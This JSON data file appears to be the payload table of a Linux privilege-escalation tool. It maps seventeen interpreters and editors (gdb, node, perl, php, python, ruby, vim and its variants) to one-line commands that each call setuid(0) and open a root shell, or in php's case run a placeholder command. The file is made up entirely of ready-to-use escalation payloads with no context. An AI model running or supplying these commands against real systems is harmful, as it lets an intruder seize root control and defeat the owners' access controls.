{
	"gdb":"gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
	"node":"node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
	"perl":"perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
	"php":"php -r \"posix_setuid(0); system('$CMD');\"",
	"python":"python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
	"python2":"python2 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
	"python2.7":"python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
	"python3":"python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
	"python3.7":"python3.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
	"python3.8":"python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
	"python3.9":"python3.9 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
	"ruby":"ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
	"rview":"rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
	"rvim":"rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
	"view":"view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
	"vim":"vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
	"vimdiff":"vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
}
